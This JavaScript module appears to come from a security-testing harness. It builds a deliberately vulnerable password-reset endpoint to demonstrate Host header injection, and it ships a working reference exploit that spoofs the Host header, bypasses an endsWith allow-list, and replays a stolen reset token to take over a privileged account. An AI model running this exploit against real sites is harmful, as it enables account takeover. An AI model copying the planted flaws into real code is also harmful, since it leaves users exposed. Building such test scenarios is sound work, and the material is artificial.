// WSTG-INPV-17 (4.7.17) — Host Header Injection.
//
// In-memory state. Single deploy instance, transient.
//
// Flow (intended):
//   GET  forgotPasswordPath              -> form (account identifier entry)
//   POST forgotPasswordPath  { email }   -> mints a per-account reset token,
//                                           constructs the absolute link as
//                                             scheme + Host header + resetPath + ?token=…
//                                           and responds with the link inline
//                                           ("preview before we send") for any
//                                           known identifier
//   GET  resetPath?token=…               -> if token belongs to the privileged
//                                           account, render the canary view
//
// Vulnerability:
//   T0 — the link is built from req.headers.host with no validation. The
//        attacker submits POST forgotPasswordPath with Host set to a domain of
//        their choosing; the response embeds that domain in the preview URL.
//        The reset token, however, is valid against the live deploy — the
//        attacker simply takes the token and hits the deploy directly.
//
//   T1 — the handler validates Host against a learned allow-list of hostnames
//        the deploy has seen on prior non-vulnerable traffic. The check uses
//        endsWith semantics rather than equality. Bypass: send Host as
//        "<arbitrary>.<learned-host>" — the suffix match passes, the
//        constructed URL still embeds an attacker-shaped subdomain, the token
//        is still live, and the attacker still extracts it and calls resetPath
//        on the real deploy.
//
// The "knownHosts" registry is populated on any request whose pathname is NOT
// forgotPasswordPath — so the attacker cannot warm the registry by spoofing
// during the vulnerable POST itself.

import crypto from 'node:crypto'
import { Scenario } from './scenario.mjs'

const TOKEN_TTL_MS = 30 * 60 * 1000

let STATE = null
function state(scenario, canary) {
  if (!STATE) {
    STATE = {
      tokens: new Map(),       // token -> { account, expiresAt }
      knownHosts: new Set(),   // learned over time from non-vulnerable traffic
      canary,
      privilegedAccount: scenario.privilegedAccountIdentifier,
    }
  }
  return STATE
}

const newToken = () => 'rt_' + crypto.randomBytes(12).toString('hex')

// Host observations collected from matchesRequest before STATE is initialised.
// Drained into STATE.knownHosts on the first handleRequest call.
const PENDING_HOSTS = new Set()
function learnHost(host) { PENDING_HOSTS.add(host) }
function flushPendingHosts(st) {
  for (const h of PENDING_HOSTS) st.knownHosts.add(h)
  PENDING_HOSTS.clear()
}

function escapeHtml(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}
function escapeAttr(s) { return escapeHtml(s) }

function renderForgotForm(scenario, msg = '') {
  const err = msg ? `<p style="color:#b00;margin:0 0 12px;font-size:13px">${escapeHtml(msg)}</p>` : ''
  return `<form method="POST" action="${escapeAttr(scenario.forgotPasswordPath)}"
      style="display:flex;flex-direction:column;gap:12px;max-width:380px">
    ${err}
    <label style="display:flex;flex-direction:column;gap:4px">
      <span style="font-size:13px">Account email</span>
      <input type="text" name="email" required autocomplete="email"
        style="padding:9px 12px;border:1px solid #c8c8c8;border-radius:6px;font-size:14px">
    </label>
    <button type="submit" style="padding:10px 14px;background:#1c1917;color:white;border:0;border-radius:6px;font-size:14px;cursor:pointer">Send the link</button>
  </form>`
}

// Build the absolute link the way a typical "construct from request Host"
// implementation does. The scheme follows X-Forwarded-Proto if the deploy is
// fronted by a TLS edge (true on Fly), otherwise http.
function constructLink(req, host, scenario, token) {
  const proto = (typeof req.headers['x-forwarded-proto'] === 'string'
    && /^(http|https)$/.test(req.headers['x-forwarded-proto']))
    ? req.headers['x-forwarded-proto']
    : 'https'
  return `${proto}://${host}${scenario.resetPath}?token=${encodeURIComponent(token)}`
}

// T1 host validation. The allow-list is the set of hostnames the deploy has
// observed on non-vulnerable traffic. The check uses endsWith — so a value
// like "evil.<deploy-host>" satisfies the suffix without being the deploy.
function hostAllowedT1(supplied, knownHosts) {
  if (!supplied) return false
  const lower = String(supplied).toLowerCase()
  for (const known of knownHosts) {
    const k = known.toLowerCase()
    if (lower === k) return true
    if (lower.endsWith(k)) return true   // <-- the flaw at T1
  }
  return false
}

export const classDef = {
  wstgId: 'WSTG-INPV-17',
  class: 'Host Header Injection',
  defenceTiers: [0, 1],
  Scenario,
  needsSignup: false,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: (s) => s.forgotPasswordPath,
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string'
    && s.chromeInjection.html.includes(s.forgotPasswordPath),

  // matchesRequest fires for EVERY inbound request via the runtime pipeline,
  // and we (ab)use that to maintain a known-hosts registry from non-vulnerable
  // traffic. Returning the actual match boolean is unaffected.
  matchesRequest({ reqUrl, req, scenario }) {
    const p = reqUrl.pathname
    const incomingHost = typeof req.headers.host === 'string' ? req.headers.host : ''
    // Side effect: learn the deploy's real hostname from any traffic that is
    // NOT the vulnerable POST. We exclude forgotPasswordPath unconditionally
    // so an attacker can't warm the allow-list with a spoofed Host by sending
    // it straight to the vulnerable endpoint.
    if (incomingHost && p !== scenario.forgotPasswordPath) {
      // Cheap re-entry guard so we don't allocate STATE here until canary is
      // available. Use a module-scope set.
      learnHost(incomingHost.toLowerCase())
    }
    if (p === scenario.forgotPasswordPath && (req.method === 'GET' || req.method === 'POST')) return true
    if (p === scenario.resetPath && req.method === 'GET') return true
    return false
  },

  async handleRequest({ req, reqUrl, scenario, helpers, renderPage, manifest }) {
    const p = reqUrl.pathname
    const tier = manifest.defenceTier || 0
    const st = state(scenario, manifest.perDeployCanary)

    // Drain any host observations the matchesRequest side-effect collected
    // before STATE was initialised, then continue learning normally.
    flushPendingHosts(st)
    const incomingHost = typeof req.headers.host === 'string' ? req.headers.host : ''
    if (incomingHost && p !== scenario.forgotPasswordPath) {
      st.knownHosts.add(incomingHost.toLowerCase())
    }

    // Reset endpoint — opening the constructed link.
    if (p === scenario.resetPath && req.method === 'GET') {
      const token = reqUrl.searchParams.get('token') || ''
      const rec = st.tokens.get(token)
      if (!rec || rec.expiresAt < Date.now()) {
        return {
          status: 400,
          body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center">'
            + '<h1 style="font-size:22px;margin:0 0 12px">Link expired</h1>'
            + '<p style="color:#555">This recovery link is no longer valid.</p>'
            + '</section>'),
        }
      }
      if (rec.account !== st.privilegedAccount) {
        // Token for a non-privileged account — still confirm reset, but no canary.
        return {
          status: 200,
          body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center">'
            + '<p>Recovery completed.</p>'
            + '</section>'),
        }
      }
      const body = scenario.resetPageBody
        .replaceAll('{CANARY}', st.canary)
        .replaceAll('{ACCOUNT}', escapeHtml(rec.account))
      return { status: 200, body: renderPage(body) }
    }

    // Forgot-password surface.
    if (p === scenario.forgotPasswordPath) {
      if (req.method === 'GET') {
        return {
          status: 200,
          body: renderPage(scenario.forgotPasswordIntro.replace('{FORM}', renderForgotForm(scenario))),
        }
      }

      // POST.
      const form = new URLSearchParams(helpers.rawBody || '')
      const email = (form.get('email') || '').trim()
      if (!email) {
        return {
          status: 400,
          body: renderPage(scenario.forgotPasswordIntro.replace('{FORM}', renderForgotForm(scenario, 'Please enter an account email.'))),
        }
      }

      // Recover the supplied Host. At T1, validate it against the learned
      // allow-list with endsWith semantics — the very flaw under test.
      const supplied = incomingHost
      if (tier >= 1) {
        if (!hostAllowedT1(supplied, st.knownHosts)) {
          return {
            status: 400,
            body: renderPage('<section style="max-width:520px;margin:48px auto;text-align:center">'
              + '<h1 style="font-size:22px;margin:0 0 12px">Request rejected</h1>'
              + '<p style="color:#555">The requested host is not recognised for this site.</p>'
              + '</section>'),
          }
        }
      }

      // Mint a per-account token. The link is built from the supplied Host —
      // unconditionally at T0, conditionally (suffix-validated) at T1. Either
      // way the token itself is valid against the real deploy.
      const token = newToken()
      st.tokens.set(token, { account: email, expiresAt: Date.now() + TOKEN_TTL_MS })
      const link = constructLink(req, supplied || 'localhost', scenario, token)

      return {
        status: 200,
        body: renderPage(scenario.linkPreviewIntro.replace('{LINK}', escapeHtml(link))),
      }
    }

    return { status: 404, body: renderPage('<p>Not found.</p>') }
  },

  // Reference exploit. Two phases keyed by payload tag:
  //   t0-host-spoof     — direct Host override, no validation in the way
  //   t1-suffix-bypass  — Host set to "<random>.<deploy-host>" to pass the
  //                       endsWith check at T1
  //
  // Node's high-level fetch() does NOT forward a Host header override; it
  // rewrites Host from the URL hostname. We use the lower-level http/https
  // request APIs so the spoofed Host is actually transmitted. The TLS SNI is
  // set to the real deploy hostname so the edge serves the right certificate.
  async fireExploit({ baseUrl, scenario, payload }) {
    const httpMod = await import('node:http')
    const httpsMod = await import('node:https')
    const { URL } = await import('node:url')
    const url = new URL(baseUrl)
    const isHttps = url.protocol === 'https:'
    const port = url.port ? Number(url.port) : (isHttps ? 443 : 80)
    const transport = isHttps ? httpsMod : httpMod

    function rawRequest({ method, path, hostHeader, body }) {
      return new Promise((resolve, reject) => {
        const opts = {
          host: url.hostname,
          port,
          path,
          method,
          servername: url.hostname,         // SNI — keep TLS sane
          headers: {
            Host: hostHeader,               // the actual Host the server sees
            'X-Forwarded-Proto': isHttps ? 'https' : 'http',
            ...(body != null
              ? { 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': Buffer.byteLength(body) }
              : {}),
          },
        }
        const req = transport.request(opts, (res) => {
          const chunks = []
          res.on('data', (c) => chunks.push(c))
          res.on('end', () => resolve({
            status: res.statusCode || 0,
            headers: res.headers,
            body: Buffer.concat(chunks).toString(),
          }))
        })
        req.on('error', reject)
        if (body != null) req.write(body)
        req.end()
      })
    }

    // Step 1. Warm the allow-list with a benign request that uses the real
    // deploy hostname — needed at T1 so a suffix derived from it is honoured.
    await rawRequest({ method: 'GET', path: '/', hostHeader: url.hostname }).catch(() => null)

    // Step 2. Choose the Host header value for the POST.
    let hostHeader
    if (payload === 't1-suffix-bypass') {
      const prefix = 'evil-' + crypto.randomBytes(3).toString('hex')
      hostHeader = `${prefix}.${url.hostname}`     // endsWith(realhost) — passes T1
    } else {
      hostHeader = 'attacker-controlled.example'   // pure spoof — passes T0
    }

    // Step 3. Submit the recovery form with the chosen Host. The response is
    // the preview interstitial; the constructed link carries our chosen Host
    // and a freshly-minted reset token bound to the privileged account.
    const postBody = `email=${encodeURIComponent(scenario.privilegedAccountIdentifier)}`
    const post = await rawRequest({
      method: 'POST',
      path: scenario.forgotPasswordPath,
      hostHeader,
      body: postBody,
    })
    if (post.status !== 200) {
      return { status: post.status, body: '(forgot-password POST failed)\n' + (post.body || '') }
    }

    // Step 4. Recover the token. The handler escapes the link's HTML, so
    // the token is plainly visible as ?token=rt_xxxxxxxxxxxx in the response.
    const m = post.body.match(/rt_[0-9a-f]{24}/)
    if (!m) {
      return { status: 200, body: '(no token in preview)\n' + post.body.slice(0, 400) }
    }
    const token = m[0]

    // Step 5. Hit the reset path on the real deploy. This is the punchline of
    // the atomic — the Host the LINK pointed at doesn't matter, because the
    // token was minted by the live deploy and the live deploy honours it.
    const open = await rawRequest({
      method: 'GET',
      path: `${scenario.resetPath}?token=${encodeURIComponent(token)}`,
      hostHeader: url.hostname,
    })
    return { status: open.status, body: open.body }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    typeof responseBody === 'string' && responseBody.includes(perDeployCanary),
}

export const __test = {
  resetState: () => { STATE = null },
  getState: () => STATE,
}
